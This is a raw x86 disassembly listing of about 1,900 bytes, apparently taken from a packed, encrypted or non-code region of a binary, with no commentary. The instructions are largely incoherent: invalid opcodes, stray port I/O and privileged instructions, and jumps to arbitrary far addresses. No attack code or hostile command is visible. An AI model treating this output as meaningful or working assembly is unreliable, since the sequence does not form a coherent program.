  419ced:	add    edi,DWORD PTR [ebx+0x186cb0d6]
  419cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cf4:	mov    ebp,0xf3d061e5
  419cf9:	mov    edi,0x2abbb462
  419cfe:	mov    ecx,0x9e56eae0
  419d03:	mov    ah,0x2f
  419d05:	adc    esi,DWORD PTR [edx-0x4bf36dbe]
  419d0b:	int    0x73
  419d0d:	loopne 0x419d68
  419d0f:	div    DWORD PTR [edi+eax*2]
  419d12:	fiadd  DWORD PTR [edi+0x78]
  419d15:	bound  edx,QWORD PTR [ebp+0x42e63e86]
  419d1b:	adc    al,bh
  419d1d:	lahf   
  419d1e:	jnp    0x419d6a
  419d20:	enter  0xdd8a,0x83
  419d24:	(bad)  
  419d25:	stc    
  419d26:	bound  esp,QWORD PTR [ecx]
  419d28:	jle    0x419d05
  419d2a:	test   al,0xa8
  419d2c:	(bad)  
  419d2d:	lock add BYTE PTR [ebx+0x47],bh
  419d31:	sbb    eax,0x3776ad31
  419d36:	cs fucomp st(6)
  419d39:	or     esi,edi
  419d3b:	int3   
  419d3c:	in     al,0x6c
  419d3e:	out    0x39,eax
  419d40:	xor    bl,BYTE PTR [edi-0x34894af]
  419d46:	out    0xaf,eax
  419d48:	test   BYTE PTR [ebp+0x6bcd1fcb],dl
  419d4e:	pop    esi
  419d4f:	outs   dx,DWORD PTR ds:[esi]
  419d50:	bound  esi,QWORD PTR [ebx]
  419d52:	dec    esi
  419d53:	dec    ecx
  419d54:	ins    DWORD PTR es:[edi],dx
  419d55:	mov    DWORD PTR [ebp+0xa],edx
  419d58:	cld    
  419d59:	and    BYTE PTR ds:0x95b2198,al
  419d5f:	xchg   DWORD PTR [eax],esp
  419d61:	pop    ebx
  419d62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d63:	lahf   
  419d64:	or     eax,0x26dde50d
  419d69:	icebp  
  419d6a:	(bad)  
  419d6b:	leave  
  419d6c:	sbb    al,0xe7
  419d6e:	data16 and BYTE PTR [eax],ch
  419d71:	xchg   edi,eax
  419d72:	hlt    
  419d73:	retf   
  419d74:	adc    esi,edx
  419d76:	jmp    0xe16c:0x63c53d82
  419d7d:	into   
  419d7e:	scas   al,BYTE PTR es:[edi]
  419d7f:	add    DWORD PTR [ebp+0xc],edx
  419d82:	or     DWORD PTR [ecx],edi
  419d84:	mov    al,0xfe
  419d86:	sub    eax,0x92c4fb4b
  419d8b:	or     al,0xbc
  419d8d:	repz push cs
  419d8f:	mov    ds:0x2895c676,al
  419d94:	popf   
  419d95:	inc    eax
  419d96:	test   eax,0x6aee2e14
  419d9b:	sti    
  419d9c:	xor    DWORD PTR [ecx+0x4b5739e1],0x77
  419da3:	stos   BYTE PTR es:[edi],al
  419da4:	add    eax,0x1b3b50b7
  419da9:	(bad)  
  419daa:	cmp    al,0x87
  419dac:	inc    eax
  419dad:	out    0xcf,eax
  419daf:	cmp    DWORD PTR [esi+0x56],edi
  419db2:	and    al,0x56
  419db4:	add    al,0xb5
  419db6:	shl    DWORD PTR ds:0xbcc75196,0x8e
  419dbd:	ss (bad) 
  419dbf:	das    
  419dc0:	rol    DWORD PTR [edx],0xf
  419dc3:	or     eax,0x573209a9
  419dc8:	sbb    DWORD PTR [ecx+0x7e],0xffffffd3
  419dcc:	xor    BYTE PTR [esi],ah
  419dce:	mov    dh,0x1f
  419dd0:	xchg   esp,eax
  419dd1:	jns    0x419da9
  419dd3:	aad    0xae
  419dd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dd6:	sbb    dh,BYTE PTR [ebx+0x7a]
  419dd9:	mov    ch,0xa0
  419ddb:	ss push eax
  419ddd:	inc    ebp
  419dde:	and    ebx,0x12
  419de1:	test   al,0xbd
  419de3:	xchg   BYTE PTR [edx+0x3b25a47e],ah
  419de9:	push   es
  419dea:	pop    edx
  419deb:	call   0x1e9f8087
  419df0:	pushf  
  419df1:	repz add esi,DWORD PTR [ecx]
  419df4:	stos   BYTE PTR es:[edi],al
  419df5:	ret    0x8087
  419df8:	mov    esi,0x53a8b495
  419dfd:	cld    
  419dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dff:	xor    DWORD PTR [ebp*2-0x5bb7aa86],0xa7f610ed
  419e0a:	fstp   TBYTE PTR [edx]
  419e0c:	cmp    ebp,esi
  419e0e:	(bad)  
  419e10:	in     al,dx
  419e11:	dec    ebp
  419e12:	add    al,0xf1
  419e14:	fmul   QWORD PTR [edx-0xa2aca92]
  419e1a:	arpl   WORD PTR [edx],di
  419e1c:	mov    eax,ds:0xa86fdfc3
  419e21:	adc    BYTE PTR ds:0xa96e9042,al
  419e27:	sti    
  419e28:	enter  0x3193,0xca
  419e2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e2d:	jmp    0x59f0:0x118d39f0
  419e34:	cwde   
  419e35:	mov    dl,0x3b
  419e37:	addr16 not bl
  419e3a:	add    ebx,DWORD PTR [esi]
  419e3c:	sbb    BYTE PTR [ebp+0x2d],dh
  419e3f:	dec    edi
  419e40:	dec    esi
  419e41:	rol    eax,0x56
  419e44:	push   eax
  419e45:	sub    al,bl
  419e47:	inc    ebx
  419e48:	fcomp  QWORD PTR [edx-0x5b6e07c]
  419e4e:	mov    eax,ds:0x5cf85fe0
  419e53:	or     BYTE PTR [esi],0xa9
  419e56:	outs   dx,DWORD PTR ds:[esi]
  419e57:	mov    esi,0x501308da
  419e5c:	mov    cl,0x17
  419e5e:	xlat   BYTE PTR ds:[ebx]
  419e5f:	in     eax,0x42
  419e61:	not    edi
  419e63:	xor    ebx,DWORD PTR [edx+0x52fc84b8]
  419e69:	call   0xde77:0x1f12b142
  419e70:	mov    DWORD PTR [eax+0x3067994c],esp
  419e76:	jbe    0x419e5b
  419e78:	xchg   ebp,eax
  419e79:	leave  
  419e7a:	int    0x9f
  419e7c:	push   ss
  419e7d:	stos   DWORD PTR es:[edi],eax
  419e7e:	xchg   ebx,eax
  419e7f:	sbb    DWORD PTR [bx+si-0x78bc],0xffffffc3
  419e85:	pusha  
  419e86:	cmc    
  419e87:	mov    esi,0x19f1bc70
  419e8c:	ss jp  0x419e5b
  419e8f:	lods   eax,DWORD PTR ds:[esi]
  419e90:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  419e92:	fwait
  419e93:	or     DWORD PTR [esi-0x80],edi
  419e96:	pop    ss
  419e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e98:	pusha  
  419e99:	mov    bl,0xef
  419e9b:	inc    esi
  419e9c:	lods   al,BYTE PTR ds:[esi]
  419e9d:	mov    ecx,0x2c638e44
  419ea2:	pop    esi
  419ea3:	sbb    eax,0xa2a874f4
  419ea8:	daa    
  419ea9:	jmp    0x419ed2
  419eab:	adc    edx,DWORD PTR [edi+0x4e]
  419eae:	aaa    
  419eaf:	xchg   ecx,eax
  419eb0:	loopne 0x419e56
  419eb2:	fnstsw WORD PTR [esi]
  419eb4:	inc    ebp
  419eb5:	mov    ds:0x198be52a,eax
  419eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ebb:	ins    DWORD PTR es:[edi],dx
  419ebc:	mov    cl,0x45
  419ebe:	xchg   DWORD PTR [ebx-0x45b31296],esi
  419ec4:	dec    esi
  419ec5:	sub    eax,0x8a990bd
  419eca:	retf   0xf6ee
  419ecd:	aam    0x3a
  419ecf:	push   edi
  419ed0:	in     al,dx
  419ed1:	push   edx
  419ed2:	dec    ebx
  419ed3:	mov    ch,0x1a
  419ed5:	mov    esp,cs
  419ed7:	pushf  
  419ed8:	lods   eax,DWORD PTR ds:[esi]
  419ed9:	out    dx,al
  419eda:	ret    
  419edb:	xor    BYTE PTR [edi],0xf4
  419ede:	sti    
  419edf:	sub    al,0x11
  419ee1:	or     esp,DWORD PTR [ecx-0x72]
  419ee4:	neg    BYTE PTR [edi+0x24]
  419ee7:	ja     0x419eaa
  419ee9:	push   cs
  419eea:	and    esp,esi
  419eec:	ds arpl sp,dx
  419eef:	cmp    al,0xed
  419ef1:	repz lea esp,ds:0x647377c6
  419ef8:	(bad)  
  419ef9:	fcmovb st,st(5)
  419efb:	dec    eax
  419efc:	or     DWORD PTR [ebp+0x3dc32794],esi
  419f02:	int    0xbb
  419f04:	cs or  dh,bl
  419f07:	fadd   QWORD PTR [ebp-0x4d]
  419f0a:	fistp  DWORD PTR [ebx-0x13]
  419f0d:	stos   DWORD PTR es:[edi],eax
  419f0e:	sbb    eax,0xaadf05b6
  419f13:	mov    cl,0x16
  419f15:	adc    DWORD PTR [edx-0x4619a9f2],0xa97e353e
  419f1f:	adc    DWORD PTR [esi+0x4a6bd270],ebp
  419f25:	mov    ah,0xfd
  419f27:	pop    esi
  419f28:	mov    ah,0xa9
  419f2a:	pop    es
  419f2b:	lahf   
  419f2c:	and    edx,DWORD PTR [eax+0x55]
  419f2f:	and    al,0xf2
  419f31:	sub    DWORD PTR [ebp+0x124b0516],ebp
  419f37:	pop    ds
  419f38:	pop    esi
  419f39:	push   esi
  419f3a:	loope  0x419fa6
  419f3c:	dec    ecx
  419f3d:	pop    edx
  419f3e:	fucomp st(4)
  419f40:	or     BYTE PTR [edi],bh
  419f42:	ret    
  419f43:	pop    eax
  419f44:	jns    0x419fa0
  419f46:	pop    ebp
  419f47:	lahf   
  419f48:	jb     0x419fb6
  419f4a:	es mov edi,0x227d036d
  419f50:	sub    al,0x23
  419f52:	xchg   ecx,eax
  419f53:	or     al,ah
  419f55:	scas   al,BYTE PTR es:[edi]
  419f56:	mov    edx,0xb67cb37
  419f5b:	inc    edx
  419f5c:	mov    esp,0x43a1f948
  419f61:	sbb    eax,0x738e9311
  419f66:	jmp    0x97095aee
  419f6b:	addr16 (bad) 
  419f6d:	pop    esp
  419f6e:	into   
  419f6f:	popf   
  419f70:	add    eax,0xc250120d
  419f75:	sub    edx,esi
  419f77:	mov    esp,0x2835c61f
  419f7c:	mov    DWORD PTR [ecx-0x32ee7cf3],ebx
  419f82:	pop    edi
  419f83:	inc    esi
  419f84:	mov    BYTE PTR [ebx+0x7d],ch
  419f87:	jbe    0x419f26
  419f89:	mov    bl,0x15
  419f8b:	fist   WORD PTR [esi-0x3a80357b]
  419f91:	cmp    eax,0xdbac3f4e
  419f96:	aas    
  419f97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f98:	inc    esi
  419f99:	aad    0xf7
  419f9b:	popa   
  419f9c:	aam    0x2d
  419f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f9f:	jmp    0xffc9:0xcc72497b
  419fa6:	into   
  419fa7:	mov    al,0x10
  419fa9:	sbb    BYTE PTR [ebx-0x622c9203],bl
  419faf:	or     dl,BYTE PTR [esi]
  419fb1:	jo     0x419fd0
  419fb3:	ins    BYTE PTR es:[edi],dx
  419fb4:	xlat   BYTE PTR ds:[ebx]
  419fb5:	fstp   DWORD PTR ds:0xbfb7d52b
  419fbb:	je     0x41a00e
  419fbd:	mov    BYTE PTR [eax+0x6a281b0f],bl
  419fc3:	xchg   esp,eax
  419fc4:	add    al,0x27
  419fc6:	xor    dh,BYTE PTR [eax]
  419fc8:	retf   
  419fc9:	jl     0x419fdd
  419fcb:	loop   0x419ffa
  419fcd:	add    DWORD PTR [ebx],0xe86dfae0
  419fd3:	and    DWORD PTR [esi],edx
  419fd5:	lods   eax,DWORD PTR ds:[esi]
  419fd6:	push   eax
  419fd7:	(bad)  
  419fd8:	mov    bl,BYTE PTR [edi-0x64]
  419fdb:	mov    dl,0xd8
  419fdd:	icebp  
  419fde:	push   0x39
  419fe0:	in     al,dx
  419fe1:	das    
  419fe2:	add    BYTE PTR [edi-0x54670890],0x2e
  419fe9:	xchg   esi,eax
  419fea:	div    dl
  419fec:	jae    0x419feb
  419fee:	leave  
  419fef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ff0:	aam    0x9d
  419ff2:	ret    
  419ff3:	pop    ecx
  419ff4:	xor    BYTE PTR [esi+0x11],0x83
  419ff8:	pop    esp
  419ff9:	mov    edi,gs
  419ffb:	and    DWORD PTR [edx],0x79c99623
  41a001:	inc    ebp
  41a002:	jecxz  0x41a06c
  41a004:	xchg   esp,eax
  41a005:	out    0x20,al
  41a007:	fcom   DWORD PTR [ecx+0x372d1e0c]
  41a00d:	xchg   edi,eax
  41a00e:	js     0x41a048
  41a010:	imul   ebp,DWORD PTR [edx],0x77
  41a013:	add    DWORD PTR [ebx-0xb241da0],0x55647708
  41a01d:	add    edi,DWORD PTR [ecx-0x1b6d33cd]
  41a023:	pushf  
  41a024:	out    dx,eax
  41a025:	dec    edi
  41a026:	add    edx,DWORD PTR [ecx]
  41a028:	jg     0x41a09e
  41a02a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a02b:	je     0x41a01f
  41a02d:	(bad)  
  41a02f:	mov    cl,0x68
  41a031:	pop    esp
  41a032:	pop    es
  41a033:	shr    edi,cl
  41a035:	pop    ebp
  41a036:	pop    ds
  41a037:	stos   BYTE PTR es:[edi],al
  41a038:	jmp    0x70df:0x7d301991
  41a03f:	xor    BYTE PTR [ebx+0x25],cl
  41a042:	jnp    0x41a058
  41a044:	clc    
  41a045:	xchg   ecx,eax
  41a046:	dec    eax
  41a047:	adc    edx,DWORD PTR [edi]
  41a049:	jmp    0x4b52:0xd405cfda
  41a050:	std    
  41a051:	lahf   
  41a052:	pop    eax
  41a053:	imul   eax,ebx,0x1002c9b
  41a059:	arpl   sp,dx
  41a05b:	xlat   BYTE PTR ds:[ebx]
  41a05c:	test   DWORD PTR [esi-0x3d],edx
  41a05f:	sub    al,0x45
  41a061:	fwait
  41a062:	pop    es
  41a063:	mov    ebp,0xc2062a7c
  41a068:	mov    eax,edx
  41a06a:	push   ebp
  41a06b:	enter  0x6879,0x7
  41a06f:	hlt    
  41a070:	sbb    BYTE PTR [ecx],bl
  41a072:	push   edx
  41a073:	push   0x22b69a23
  41a078:	(bad)  
  41a079:	fs in  al,dx
  41a07b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a07c:	jnp    0x41a0b8
  41a07e:	push   edi
  41a07f:	ins    DWORD PTR es:[edi],dx
  41a080:	jnp    0x41a05c
  41a082:	mov    ds:0x6e6ab771,al
  41a087:	mov    BYTE PTR [ebx+0x7926095],0x9
  41a08e:	mov    edi,0x68ad9305
  41a093:	das    
  41a094:	sub    al,0xc6
  41a096:	imul   edi,esi,0x74
  41a099:	int    0xa5
  41a09b:	mov    BYTE PTR [ebx],bl
  41a09d:	sub    ch,BYTE PTR [eax*1+0x318004bf]
  41a0a4:	daa    
  41a0a5:	push   es
  41a0a6:	or     al,0xab
  41a0a8:	push   esp
  41a0a9:	dec    edx
  41a0aa:	enter  0xde4e,0x7d
  41a0ae:	pop    esi
  41a0af:	pop    ecx
  41a0b0:	mov    bl,0xa4
  41a0b2:	je     0x41a055
  41a0b4:	das    
  41a0b5:	sbb    al,BYTE PTR [ebx+0x7bfe734f]
  41a0bb:	xchg   ebx,eax
  41a0bc:	shrd   ebp,esi,cl
  41a0bf:	stc    
  41a0c0:	xlat   BYTE PTR ds:[ebx]
  41a0c1:	push   0x6c
  41a0c3:	hlt    
  41a0c4:	stos   DWORD PTR es:[edi],eax
  41a0c5:	jns    0x41a0d7
  41a0c7:	mov    eax,ebp
  41a0c9:	pop    eax
  41a0ca:	push   0xe37b7da8
  41a0cf:	sbb    DWORD PTR [ebx-0x7c],ebp
  41a0d2:	leave  
  41a0d3:	jnp    0x41a0b1
  41a0d5:	fimul  DWORD PTR [edi+0x2a]
  41a0d8:	test   DWORD PTR [eax+eiz*1-0x47],eax
  41a0dc:	sbb    DWORD PTR [eax+0x9],ebx
  41a0df:	fs imul esi,eax,0x64271767
  41a0e6:	pop    esi
  41a0e7:	dec    ebx
  41a0e8:	sub    bh,0xb4
  41a0eb:	outs   dx,DWORD PTR ds:[esi]
  41a0ec:	sbb    BYTE PTR [esi+0x265d8805],cl
  41a0f2:	xlat   BYTE PTR ds:[ebx]
  41a0f3:	frstor [ecx-0x23cb6da9]
  41a0f9:	pop    eax
  41a0fa:	daa    
  41a0fb:	pop    edx
  41a0fc:	cmp    DWORD PTR ds:0x4cbecef3,esp
  41a102:	xor    dh,bl
  41a104:	lea    esp,[eax+edx*1-0x2]
  41a108:	imul   ebp,DWORD PTR ds:0x16e515e1,0xfffffff4
  41a10f:	xor    eax,0xcdbc73c9
  41a114:	gs jmp 0x5986:0x49cef56
  41a11c:	jmp    0xda0a:0xb4501723
  41a123:	mov    al,ds:0xf0735b6f
  41a128:	outs   dx,BYTE PTR ds:[esi]
  41a129:	enter  0x386f,0x76
  41a12d:	mov    ah,0x5b
  41a12f:	bound  ebp,QWORD PTR [esi-0x2290bdb9]
  41a135:	addr16 dec ebp
  41a137:	mov    ch,0xe6
  41a139:	les    edx,FWORD PTR [eax-0x24]
  41a13c:	pusha  
  41a13d:	sbb    eax,0xe42b43d5
  41a142:	fidivr WORD PTR [edi-0x1a]
  41a145:	sub    al,0xef
  41a147:	cs dec ecx
  41a149:	jecxz  0x41a0d3
  41a14b:	xor    ch,BYTE PTR [edi]
  41a14d:	sub    ch,dl
  41a14f:	mov    fs,WORD PTR [ebx+0x57]
  41a152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a153:	mov    WORD PTR [ebx+eiz*4-0x6034069a],ax
  41a15b:	ficomp DWORD PTR [ebx+eiz*1]
  41a15e:	jno    0x41a13c
  41a160:	(bad)  
  41a161:	jg     0x41a17a
  41a163:	add    DWORD PTR [edx+0x61b2820],0x25fdbb30
  41a16d:	aaa    
  41a16e:	shl    DWORD PTR [esi+0x72904275],0x78
  41a175:	push   cs
  41a176:	ins    BYTE PTR es:[edi],dx
  41a177:	jl     0x41a162
  41a179:	dec    ebp
  41a17a:	into   
  41a17b:	loope  0x41a126
  41a17d:	cmp    DWORD PTR [esp+edi*8-0x7fdfa066],0x75
  41a185:	icebp  
  41a186:	xchg   edx,eax
  41a187:	(bad)  [esi+0x7e]
  41a18a:	mov    BYTE PTR [ebx+0x41],cl
  41a18d:	xor    eax,0x14c0316e
  41a192:	clc    
  41a193:	imul   esi,eax,0xc0e4feff
  41a199:	jmp    0xe21054df
  41a19e:	test   DWORD PTR [ecx+0xc],ebx
  41a1a1:	or     dh,al
  41a1a3:	neg    bl
  41a1a5:	lds    edx,FWORD PTR [eax]
  41a1a7:	mov    eax,0xc2073b57
  41a1ac:	ss mov ebp,0x69ea12ae
  41a1b2:	xchg   edi,eax
  41a1b3:	xor    ebp,DWORD PTR [edi+0x7]
  41a1b6:	pusha  
  41a1b7:	shl    BYTE PTR [ecx-0x74a57c2c],0xf6
  41a1be:	inc    ebx
  41a1bf:	dec    edi
  41a1c0:	push   ebx
  41a1c1:	jno    0x41a174
  41a1c3:	adc    DWORD PTR [esi],edi
  41a1c5:	mov    bl,0xb
  41a1c7:	je     0x41a202
  41a1c9:	push   edi
  41a1ca:	fstp   QWORD PTR [esp+esi*1-0x2b]
  41a1ce:	and    DWORD PTR [edi-0x6c],esi
  41a1d1:	mov    edi,0xb828bf48
  41a1d6:	cmp    eax,0x52452018
  41a1db:	jg     0x41a1ca
  41a1dd:	fistp  QWORD PTR [ebx+ebp*8+0x7a2d184b]
  41a1e4:	dec    ecx
  41a1e5:	add    al,0x62
  41a1e7:	leave  
  41a1e8:	(bad)  
  41a1e9:	in     eax,0xbd
  41a1eb:	out    0x40,al
  41a1ed:	call   0x7e43:0xa9688a3e
  41a1f4:	jmp    0x7fa5:0x9f485682
  41a1fb:	xor    dl,BYTE PTR [ebp-0x6bffa88a]
  41a201:	(bad)  
  41a202:	push   0xa35a7487
  41a207:	pop    es
  41a208:	cwde   
  41a209:	in     eax,dx
  41a20a:	xchg   edx,eax
  41a20b:	push   ss
  41a20c:	push   eax
  41a20d:	shl    DWORD PTR ds:[ebp-0x80],1
  41a211:	clc    
  41a212:	mov    esp,0x9922be9b
  41a217:	das    
  41a218:	imul   ebp,DWORD PTR [ecx],0xffffffa5
  41a21b:	push   es
  41a21c:	jae    0x41a225
  41a21e:	lock out 0x8b,al
  41a221:	scas   eax,DWORD PTR es:[edi]
  41a222:	xor    eax,0xd9daa083
  41a227:	mov    ebp,eax
  41a229:	push   ebp
  41a22a:	in     al,dx
  41a22b:	mov    esi,DWORD PTR [ecx]
  41a22d:	rcl    cl,1
  41a22f:	jle    0x41a1d7
  41a231:	(bad)  
  41a233:	outs   dx,DWORD PTR ds:[esi]
  41a234:	(bad)  [esi]
  41a236:	jae    0x41a298
  41a238:	fistp  QWORD PTR [ebx-0x20]
  41a23b:	cwde   
  41a23c:	cmc    
  41a23d:	push   eax
  41a23e:	in     al,0xdb
  41a240:	add    ecx,esi
  41a242:	daa    
  41a243:	clc    
  41a244:	in     eax,0x7a
  41a246:	mov    gs,WORD PTR [ecx+edx*4+0x36a7a067]
  41a24d:	clc    
  41a24e:	push   eax
  41a24f:	inc    esp
  41a250:	push   0x1d
  41a252:	push   ebx
  41a253:	sbb    al,0x73
  41a255:	cwde   
  41a256:	test   eax,0x335595ed
  41a25b:	scas   al,BYTE PTR es:[edi]
  41a25c:	cmc    
  41a25d:	je     0x41a293
  41a25f:	out    dx,eax
  41a260:	leave  
  41a261:	paddsw mm4,QWORD PTR [esi]
  41a264:	pop    edi
  41a265:	jb     0x41a209
  41a267:	adc    bh,BYTE PTR [ebx]
  41a269:	outs   dx,BYTE PTR ds:[esi]
  41a26a:	iret   
  41a26b:	retf   0xd974
  41a26e:	das    
  41a26f:	dec    ecx
  41a270:	dec    edx
  41a271:	dec    eax
  41a272:	js     0x41a2c1
  41a274:	add    esp,DWORD PTR cs:[ecx+0x64a8fc10]
  41a27b:	lods   al,BYTE PTR ds:[esi]
  41a27c:	push   ebp
  41a27d:	push   edx
  41a27e:	mov    DWORD PTR [edi],0x255bfafc
  41a284:	call   0xf876fda9
  41a289:	retf   
  41a28a:	cdq    
  41a28b:	fs inc eax
  41a28d:	push   eax
  41a28e:	jae    0x41a24b
  41a290:	cmc    
  41a291:	test   DWORD PTR [edx+0x3233cc05],edi
  41a297:	mov    bl,0xc6
  41a299:	rol    DWORD PTR [edx-0x27247e50],cl
  41a29f:	lock inc edx
  41a2a1:	jp     0x41a31f
  41a2a3:	sbb    DWORD PTR [esp+ebx*8+0x57],0x13aa2747
  41a2ab:	enter  0x1ada,0x9b
  41a2af:	inc    BYTE PTR [ebx]
  41a2b1:	push   esi
  41a2b2:	pop    esi
  41a2b3:	push   ds
  41a2b4:	(bad)  
  41a2b5:	xlat   BYTE PTR ds:[ebx]
  41a2b6:	dec    esp
  41a2b7:	xor    eax,0xbe420aec
  41a2bc:	retf   
  41a2bd:	mov    esi,0xdce6eb91
  41a2c2:	sahf   
  41a2c3:	xor    BYTE PTR [ecx],0xdc
  41a2c6:	clts   
  41a2c8:	and    al,0x5f
  41a2ca:	leave  
  41a2cb:	jbe    0x41a30d
  41a2cd:	fld    QWORD PTR [edi-0x4a]
  41a2d0:	mov    eax,ds:0xd1f79f28
  41a2d5:	nop
  41a2d6:	jb     0x41a26c
  41a2d8:	xchg   esi,eax
  41a2d9:	fstp   DWORD PTR [edx-0x38e164fb]
  41a2df:	sbb    DWORD PTR [eax+0x7e1661c8],esp
  41a2e5:	add    BYTE PTR [edi+edx*1],al
  41a2e8:	pop    esi
  41a2e9:	push   ebp
  41a2ea:	and    ch,BYTE PTR [edi+eax*4+0x77d9793b]
  41a2f1:	lahf   
  41a2f2:	mov    edi,0x3ab937da
  41a2f7:	mov    ebp,0xf7801243
  41a2fc:	xchg   ebp,eax
  41a2fd:	sub    dh,BYTE PTR [edx]
  41a2ff:	jl     0x41a30b
  41a301:	add    bl,BYTE PTR [ecx+0x6544f521]
  41a307:	rcl    DWORD PTR [edi+0x7570f43a],cl
  41a30d:	jae    0x41a32a
  41a30f:	push   edi
  41a310:	mov    al,ds:0xa1410257
  41a315:	popa   
  41a316:	aam    0x60
  41a318:	imul   esp,DWORD PTR ds:0x4ad8837d,0xf3f30e99
  41a322:	loopne 0x41a33c
  41a324:	imul   edx,DWORD PTR [ecx+0x4e374036],0xba0d8405
  41a32e:	das    
  41a32f:	cld    
  41a330:	popf   
  41a331:	pusha  
  41a332:	xor    al,0x3a
  41a334:	pop    ecx
  41a335:	arpl   WORD PTR [edi+0x17],dx
  41a338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a339:	loop   0x41a35d
  41a33b:	sub    BYTE PTR [ebp-0x5c],bl
  41a33e:	cmp    al,0x8a
  41a340:	das    
  41a341:	sbb    BYTE PTR [edi],0xc9
  41a344:	push   ebx
  41a345:	mov    esi,0x44373c07
  41a34a:	retf   
  41a34b:	mov    eax,0xaeed9e0c
  41a350:	pushf  
  41a351:	out    dx,eax
  41a352:	push   es
  41a353:	das    
  41a354:	mov    WORD PTR [ebp+0xe],fs
  41a357:	fild   DWORD PTR [ecx-0x5ebbb3e2]
  41a35d:	cmp    ebp,0x14
  41a360:	mov    bh,0x98
  41a362:	xchg   esp,eax
  41a363:	in     al,0xf1
  41a365:	xchg   esp,eax
  41a366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a367:	xor    DWORD PTR [ebx],edi
  41a369:	xor    BYTE PTR [edx-0x2853aa41],bl
  41a36f:	popa   
  41a370:	outs   dx,DWORD PTR ds:[esi]
  41a371:	dec    ebx
  41a372:	dec    eax
  41a373:	arpl   WORD PTR [eax-0x7c],bx
  41a376:	sub    edi,eax
  41a378:	sbb    ebp,DWORD PTR [esi-0x60631354]
  41a37e:	pop    edi
  41a37f:	jno    0x41a3ab
  41a381:	aas    
  41a382:	ins    BYTE PTR es:[edi],dx
  41a383:	inc    eax
  41a384:	retf   0xfd78
  41a387:	pop    ebx
  41a388:	adc    al,0x43
  41a38a:	je     0x41a3c0
  41a38c:	popa   
  41a38d:	rol    DWORD PTR [esi],0xe6
  41a390:	scas   eax,DWORD PTR es:[edi]
  41a391:	loopne 0x41a3f4
  41a393:	sbb    ah,bl
  41a395:	xor    al,al
  41a397:	dec    ebx
  41a398:	cs xchg ch,bl
  41a39b:	idiv   DWORD PTR [eax+eiz*4-0x3a]
  41a39f:	jo     0x41a3b5
  41a3a1:	iret   
  41a3a2:	pop    ebx
  41a3a3:	icebp  
  41a3a4:	rcl    bl,0x51
  41a3a7:	mov    al,0xda
  41a3a9:	add    DWORD PTR [ecx+ecx*4],edi
  41a3ac:	push   ss
  41a3ad:	dec    ebx
  41a3ae:	fidivr DWORD PTR [ecx-0x4d]
  41a3b1:	in     al,0xda
  41a3b3:	pop    ds
  41a3b4:	jne    0x41a3e8
  41a3b6:	call   0xe4fc:0x99f5260b
  41a3bd:	cmp    DWORD PTR [esi+0x618bf980],ebp
  41a3c3:	inc    ecx
  41a3c4:	xor    al,0x3f
  41a3c6:	(bad)  
  41a3c7:	in     al,dx
  41a3c8:	lahf   
  41a3c9:	ret    
  41a3ca:	xchg   bh,ch
  41a3cc:	or     dh,BYTE PTR [ebp-0x13]
  41a3cf:	mov    ebx,DWORD PTR [esi]
  41a3d1:	mov    dl,0x78
  41a3d3:	js     0x41a393
  41a3d5:	sub    edi,DWORD PTR [esi-0x3c]
  41a3d8:	mov    dl,0x2e
  41a3da:	das    
  41a3db:	lods   al,BYTE PTR ds:[esi]
  41a3dc:	jae    0x41a448
  41a3de:	cmp    ah,BYTE PTR [ebp-0x86dc504]
  41a3e4:	arpl   WORD PTR ss:[esi],ax
  41a3e7:	mov    edi,0x908cf05
  41a3ec:	sbb    eax,0xec51eabc
  41a3f1:	and    BYTE PTR [eax-0x503f42f8],cl
  41a3f7:	push   ss
  41a3f8:	mov    al,ds:0xefa46f25
  41a3fd:	enter  0x8fbd,0x5c
  41a401:	add    al,0x19
  41a403:	jno    0x41a429
  41a405:	pop    ecx
  41a406:	out    dx,al
  41a407:	mov    dl,0x6
  41a409:	inc    eax
  41a40a:	and    BYTE PTR [ebx*1+0x1280eeb8],0xd0
  41a412:	push   cs
  41a413:	push   cs
  41a414:	add    al,0x23
  41a416:	jmp    0x61e4:0x752bee75
  41a41d:	sti    
  41a41e:	sub    BYTE PTR [ebp-0x4d],cl
  41a421:	push   0x4dd5c9dc
  41a426:	imul   ebx,DWORD PTR [esi-0x662057b7],0xab1332cf
  41a430:	xlat   BYTE PTR ds:[ebx]
  41a431:	dec    eax
  41a432:	loop   0x41a400
  41a434:	imul   edi,DWORD PTR [edi],0xede313b9
  41a43a:	cwde   
  41a43b:	ins    BYTE PTR es:[edi],dx
  41a43c:	popf   
  41a43d:	imul   eax,eax,0xcef16d70
  41a443:	aad    0xcf
  41a445:	ja     0x41a457
  41a447:	mov    ecx,0x24eff9ba
  41a44c:	data16 jmp 0x41a47b
  41a44f:	inc    esi
  41a450:	xor    bh,BYTE PTR [ebx+0x710e1b18]
  41a456:	aas    
  41a457:	mov    ds:0xa4451975,al
  41a45c:	pop    di
  41a45e:	mov    ebp,0xc544ff0d
  41a463:	cmp    eax,0xfb60cc83
  41a468:	and    al,0x2d
  41a46a:	fst    DWORD PTR [edi-0x18]
  41a46d:	out    dx,eax
  41a46e:	xlat   BYTE PTR ds:[ebx]
  41a46f:	leave  
  41a470:	dec    ecx
  41a471:	xchg   BYTE PTR [ebx-0x79bd24d8],al
  41a477:	xor    esp,ebx
  41a479:	stos   DWORD PTR es:[edi],eax
  41a47a:	add    ch,dh
  41a47c:	mov    ah,0x5
  41a47e:	ror    DWORD PTR [eax+0x2928057f],cl
  41a484:	in     al,dx
  41a485:	push   ebx
  41a486:	cmc    
  41a487:	dec    ebp
  41a488:	ss (bad) 
